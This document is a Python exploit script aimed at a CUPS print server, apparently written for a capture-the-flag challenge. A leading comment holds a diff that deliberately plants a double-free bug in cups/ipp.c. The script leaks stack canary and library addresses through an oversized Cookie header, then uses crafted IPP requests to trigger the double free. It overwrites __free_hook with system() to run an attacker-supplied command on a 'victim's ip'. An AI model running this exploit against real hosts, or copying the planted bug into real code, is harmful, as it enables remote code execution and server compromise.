'''
https://github.com/apple/cups/commit/2c030c7a06e0c2b8227c7e85f5c58dfb339731d0

diff --git a/cups/ipp.c b/cups/ipp.c
index 6fae52a00..179e8bf21 100644
--- a/cups/ipp.c
+++ b/cups/ipp.c
@@ -3079,7 +3079,7 @@ ippReadIO(void       *src,                /* I - Data source */
            else if (value_tag == IPP_TAG_TEXTLANG ||
                     value_tag == IPP_TAG_NAMELANG ||
                     (value_tag >= IPP_TAG_TEXT &&
-                     value_tag <= IPP_TAG_MIMETYPE))
+                     value_tag <= IPP_TAG_MIMETYPE) || value_tag == IPP_TAG_STRING)
             {
             /*
              * String values can sometimes come across in different
@@ -6296,7 +6296,7 @@ ipp_free_values(ipp_attribute_t *attr,    /* I - Attribute to free values from */
       case IPP_TAG_UNSUPPORTED_VALUE :
       case IPP_TAG_DEFAULT :
       case IPP_TAG_UNKNOWN :
-      case IPP_TAG_NOVALUE :
       case IPP_TAG_NOTSETTABLE :
       case IPP_TAG_DELETEATTR :
       case IPP_TAG_ADMINDEFINE :
@@ -6327,7 +6327,7 @@ ipp_free_values(ipp_attribute_t *attr,    /* I - Attribute to free values from */
            if (value->unknown.data)
            {
              free(value->unknown.data);
-             value->unknown.data = NULL;
            }
          }
          break;

d3e43d79367b8b873f4989d7b3aeda76  cupsd
5591892d4add168af04fe99cf49d655d  libcups.so.2
'''

import argparse
import requests
import struct
import sys

if len(sys.argv) == 1:
        sys.argv.append("-h")

args = argparse.ArgumentParser()
args.add_argument("-r", "--remote", type = str, dest = "ip", help = "victim's ip")
args.add_argument("-p", "--port", type = int, dest = "port", default = 631, help = "ipp port number")
args.add_argument("-c", "--command", type = str, dest = "cmd", help = "command")
args = args.parse_args()

ip = args.ip
port = args.port
cmd = args.cmd
url = f"http://{ip}:{port}"
# print(url)



p8 = lambda x: struct.pack('>b', x)
p16 = lambda x: struct.pack('>h', x)
p32 = lambda x: struct.pack('>i', x)
p64 = lambda x: struct.pack('<Q', x)
u64 = lambda x: struct.unpack('<Q', x.encode('latin'))[0]

# leak
leak_header = {"Cookie": 'a' * 20000}
leak = requests.get(url, headers = leak_header)
leaked = leak.headers["Set-cookie"][16372: ]
#  import pdb; pdb.set_trace()

canary = u64(leaked[0x0: 0x08])
print("canary @ {:#x}".format(canary))
heap = u64(leaked[0x8: 0x10]) - 0xc98
print("heap @ {:#x}".format(heap))
libcups = u64(leaked[0x10: 0x18]) - 0x1d6d7
print("libcups @ {:#x}".format(libcups))
stack = u64(leaked[0x38: 0x40])
print("stack @ {:#x}".format(stack))
elf = u64(leaked[0x48: 0x50]) - 0x1d52b
print("elf @ {:#x}".format(elf))
libc = u64(leaked[0x2b0: 0x2b8]) - 0x132169
print("libc @ {:#x}".format(libc))
# leak.close()
# print(leak.text)
#

# double free
h = {
        "Content-Type": "application/ipp",
        "User-Agent": "CUPS/2.3.0 (Linux 4.15.0-70-generic; x86_64) IPP/2.0",
        "Expect": "100-continue",
        "Accept-Encoding": f"deflate, gzip, identity; {cmd} ;"
        }

payload  = p16(2)           # version
payload += p16(0x500)       # operation-id
payload += p32(0x1d)        # request-id

payload += p8(48)   # malloc
payload += p16(0x5)
payload += b'aaaaa'
payload += p16(0x90)
payload += b'b'*0x90

payload += p8(19)   # free
payload += p16(0)
payload += p16(0)

double_free = requests.post(url, headers = h, data = payload)
# double_free.close()
# print(double_free.text)
#



# hijack pc
payload  = p16(2)           # version
payload += p16(0x500)       # operation-id
payload += p32(0x1d)        # request-id


fake_fd = p64(libc + 0x3ed8e8)   # __free_hook
fake_fd = fake_fd.ljust(0x90, b'c')
payload += p8(75)   # malloc
payload += p16(0x6)
payload += b'xxxxxx'
payload += p16(0x90)
payload += fake_fd

fake_fd = p64(libc + 0x3ed8e8)   # __free_hook
fake_fd = fake_fd.ljust(0x90, b'd')
payload += p8(75)   # malloc
payload += p16(0x5)
payload += b'aaaaa'
payload += p16(0x90)
payload += fake_fd


system = p64(libc + 0x4f440)
system = system.ljust(0x90, b'\0')
payload += p8(75)   # malloc
payload += p16(0x5)
payload += b'aaaaa'
payload += p16(0x90)
payload += system

# breakpoint()
# hijack
hijack = requests.post(url, headers = h, data = payload)
# hijack.close()
# print(hijack.text)
#
